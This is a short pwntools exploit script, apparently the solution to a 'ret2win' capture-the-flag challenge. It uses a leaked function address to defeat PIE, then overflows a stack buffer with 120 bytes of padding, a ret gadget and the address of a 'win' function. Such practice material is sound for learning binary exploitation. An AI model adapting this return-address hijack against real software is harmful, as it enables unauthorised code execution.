from pwn import *
elf = context.binary = ELF("./ret2win")
p = process()
offset = 120
p.recvuntil(b"Here's a gift for you: ")
what_is_this_for_leak = int(p.recvline().strip().decode(),16)
what_is_this_for_offset = elf.sym['what_is_this_for']
print(what_is_this_for_leak)
print(what_is_this_for_offset)
elf.address = what_is_this_for_leak - what_is_this_for_offset
win = p64(elf.sym['win'])
rop = ROP(context.binary)
ret = p64(rop.find_gadget(['ret'])[0])
payload = b"A" * offset + ret + win + p64(0x0)
write("payload",payload)
p.sendline(payload)
print(p.recvall().strip().decode())